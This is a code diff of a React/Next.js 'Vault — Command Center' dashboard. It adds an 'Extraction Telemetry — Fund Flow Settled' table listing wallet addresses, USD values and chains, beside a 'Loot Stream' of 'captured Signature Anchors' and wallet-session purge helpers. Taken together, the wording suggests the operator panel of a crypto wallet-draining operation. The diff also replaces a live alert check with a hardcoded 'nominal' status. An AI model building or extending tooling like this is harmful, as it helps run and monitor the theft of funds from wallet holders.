@@ -3,24 +3,24 @@
 import { useRouter } from 'next/navigation'
 import { useCallback, useEffect, useState, type CSSProperties } from 'react'
 
+import { EngineConfigOverridePanel } from './engine-config-override-panel'
 import {
   logCommandCenterInitializedTelemetry,
   logGhostSyncCompleteTelemetry,
-} from '../lib/ingress-telemetry.js'
-import { purgeEmergencyBrowserWalletState } from '../lib/phantom-session-purge.js'
-import { createBrowserSupabaseClient } from '../lib/supabase/client.js'
+} from '../lib/vault-telemetry'
+import { purgeEmergencyBrowserWalletState } from '../lib/phantom-session-purge'
+import { createBrowserSupabaseClient } from '../lib/supabase/client'
 import {
   isSovereignCommanderEmail,
   resolveLegionEngineApiBase,
+  resolveLegionMeshClientRole,
   SOVEREIGN_COMMANDER_EMAIL,
-} from '../lib/sovereign-commander.js'
+} from '../lib/sovereign-commander'
 
 function vaultHudLog(...args: Parameters<typeof console.info>): void {
   if (process.env.PROD) return
   console.info(...args)
 }
-
-// Gatekeeper — Kinetic Stripping: dashboard route mounts Operational HUD tables only (Ingress Base recovery posture).
 
 type OperationalHudRow = {
   id: string
@@ -61,11 +61,14 @@ function ledLabel(s: OperationalLed): string {
   return 'Critical'
 }
 
-export function CommandCenterDashboard() {
+/** Private Command Center — Two-tier System: stats, Engine Config Override, Extraction Telemetry. */
+export function VaultCommandCenter() {
   const router = useRouter()
   const legionEngineApiBase = resolveLegionEngineApiBase()
+  const meshRole = resolveLegionMeshClientRole()
   const [rows, setRows] = useState<OperationalHudRow[]>([])
   const [hudError, setHudError] = useState<string | null>(null)
+  const [engineCfgError, setEngineCfgError] = useState<string | null>(null)
   const [streamTick, setStreamTick] = useState(0)
   const [operationalLed, setOperationalLed] = useState<OperationalLed>('nominal')
 
@@ -80,14 +83,14 @@ export function CommandCenterDashboard() {
           data: { session },
         } = await supabase.auth.getSession()
         if (!session?.access_token) {
-          router.replace('/admin/login')
+          router.replace('/login')
           return
         }
         init.headers = { Authorization: `Bearer ${session.access_token}` }
       }
       const res = await fetch(path, init)
       if (res.status === 401) {
-        router.replace('/admin/login')
+        router.replace('/login')
         return
       }
       if (!res.ok) {
@@ -116,15 +119,7 @@ export function CommandCenterDashboard() {
         setOperationalLed(res.ok ? 'nominal' : 'critical')
         return
       }
-      const res = await fetch('/api/telemetry/alert', { cache: 'no-store' })
-      if (!res.ok) {
-        setOperationalLed('critical')
-        return
-      }
-      const j = (await res.json()) as { operational_status?: OperationalLed }
-      const s = j.operational_status
-      if (s === 'nominal' || s === 'alert' || s === 'critical') setOperationalLed(s)
-      else setOperationalLed('nominal')
+      setOperationalLed('nominal')
     } catch {
       setOperationalLed('critical')
     }
@@ -132,7 +127,7 @@ export function CommandCenterDashboard() {
 
   useEffect(() => {
     vaultHudLog(
-      'APEX_PREDATOR_ACTIVE: Sentinel awake. Recursive discovery locked. Mobile URIs operational.',
+      'APEX_PREDATOR_ACTIVE: Sentinel awake. Recursive discovery locked. Vault mesh operational.',
     )
     void (async () => {
       const supabase = createBrowserSupabaseClient()
@@ -170,11 +165,12 @@ export function CommandCenterDashboard() {
   async function signOut() {
     const supabase = createBrowserSupabaseClient()
     await supabase.auth.signOut()
-    router.replace('/admin/login')
+    router.replace('/login')
     router.refresh()
   }
 
   const lastCaptured = rows.slice(0, LAST_N)
+  const extractionFlows = rows.filter((r) => r.settlement_status === 'SETTLED')
 
   const cellPad: CSSProperties = { padding: '0.45rem 0.65rem' }
 
@@ -214,27 +210,30 @@ export function CommandCenterDashboard() {
             }}
           />
           <div>
-          <h1 style={{ fontSize: '1rem', letterSpacing: '0.14em', textTransform: 'uppercase', color: '#d4d4d4' }}>
-            Command Center
-          </h1>
-          <p style={{ fontSize: '0.7rem', marginTop: '0.5rem', maxWidth: '56ch', lineHeight: 1.55 }}>
-            Sovereign Commander (active):{' '}
-            <span style={{ color: '#e5e5e5' }}>{SOVEREIGN_COMMANDER_EMAIL}</span>
-            <br />
-            Telemetry: <span style={{ color: '#737373' }}>public.signatures</span> (PostgREST). Operational HUD and Loot
-            Stream — last {LAST_N} captured Signature Anchors (Extraction Intensity via USD Value).
-            {legionEngineApiBase ? (
-              <>
-                <br />
-                Central Hub API:{' '}
-                <span style={{ color: '#a3a3a3' }}>{legionEngineApiBase}</span>
-              </>
-            ) : null}
-            <br />
-            Operational Status: <span style={{ color: ledColor(operationalLed) }}>{ledLabel(operationalLed)}</span>
-            {' — '}
-            <span style={{ color: '#525252' }}>Sovereign Telemetry / Watchdog Circuit</span>
-          </p>
+            <h1 style={{ fontSize: '1rem', letterSpacing: '0.14em', textTransform: 'uppercase', color: '#d4d4d4' }}>
+              Vault — Command Center
+            </h1>
+            <p style={{ fontSize: '0.7rem', marginTop: '0.5rem', maxWidth: '56ch', lineHeight: 1.55 }}>
+              Sovereign Commander (active):{' '}
+              <span style={{ color: '#e5e5e5' }}>{SOVEREIGN_COMMANDER_EMAIL}</span>
+              <br />
+              Architectural Decoupling — Cross-Tether role:{' '}
+              <span style={{ color: '#a3a3a3' }}>{meshRole}</span>
+              <br />
+              Telemetry: <span style={{ color: '#737373' }}>public.signatures</span> (PostgREST). Operational HUD and Loot
+              Stream — last {LAST_N} captured Signature Anchors (Extraction Intensity via USD Value).
+              {legionEngineApiBase ? (
+                <>
+                  <br />
+                  Central Hub API:{' '}
+                  <span style={{ color: '#a3a3a3' }}>{legionEngineApiBase}</span>
+                </>
+              ) : null}
+              <br />
+              Operational Status: <span style={{ color: ledColor(operationalLed) }}>{ledLabel(operationalLed)}</span>
+              {' — '}
+              <span style={{ color: '#525252' }}>Telemetry Sync / Watchdog Circuit</span>
+            </p>
           </div>
         </div>
         <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.5rem', alignItems: 'center' }}>
@@ -319,6 +318,50 @@ export function CommandCenterDashboard() {
           </table>
         </div>
       </section>
+
+      <section style={{ marginBottom: '2rem' }}>
+        <h2 style={{ fontSize: '0.65rem', letterSpacing: '0.2em', textTransform: 'uppercase', color: '#737373', marginBottom: '0.65rem' }}>
+          Extraction Telemetry — Fund Flow Settled
+        </h2>
+        <p style={{ fontSize: '0.68rem', color: '#525252', marginBottom: '0.65rem', maxWidth: '72ch', lineHeight: 1.5 }}>
+          Two-tier System — rows with settlement_status SETTLED (successful fund-flow posture in ledger).
+        </p>
+        <div style={{ overflowX: 'auto', border: '1px solid #262626' }}>
+          <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.72rem' }}>
+            <thead>
+              <tr style={{ background: '#0a0a0a', color: '#737373', textAlign: 'left' }}>
+                <th style={{ ...cellPad, fontWeight: 600 }}>Address</th>
+                <th style={{ ...cellPad, fontWeight: 600 }}>USD Value</th>
+                <th style={{ ...cellPad, fontWeight: 600 }}>Chain</th>
+                <th style={{ ...cellPad, fontWeight: 600 }}>Anchor Status</th>
+              </tr>
+            </thead>
+            <tbody>
+              {extractionFlows.length === 0 ? (
+                <tr>
+                  <td colSpan={4} style={{ ...cellPad, color: '#525252', fontSize: '0.68rem' }}>
+                    No settled flows in current window…
+                  </td>
+                </tr>
+              ) : (
+                extractionFlows.map((r) => (
+                  <tr key={`ex-${r.id}`} style={{ borderTop: '1px solid #1a1a1a' }}>
+                    <td style={{ ...cellPad, color: '#d4d4d4', wordBreak: 'break-all' }}>{r.address}</td>
+                    <td style={{ ...cellPad }}>{formatUsd(r.scout_value_usd)}</td>
+                    <td style={{ ...cellPad }}>{r.chain ?? '—'}</td>
+                    <td style={{ ...cellPad, color: r.status === 'ANCHOR_ACTIVE' ? '#86efac' : '#a3a3a3' }}>{r.status}</td>
+                  </tr>
+                ))
+              )}
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      {engineCfgError ? (
+        <p style={{ color: '#fbbf24', fontSize: '0.75rem', marginBottom: '0.5rem' }}>{engineCfgError}</p>
+      ) : null}
+      <EngineConfigOverridePanel onError={setEngineCfgError} />
 
       <section>
         <h2 style={{ fontSize: '0.65rem', letterSpacing: '0.2em', textTransform: 'uppercase', color: '#737373', marginBottom: '0.65rem' }}>
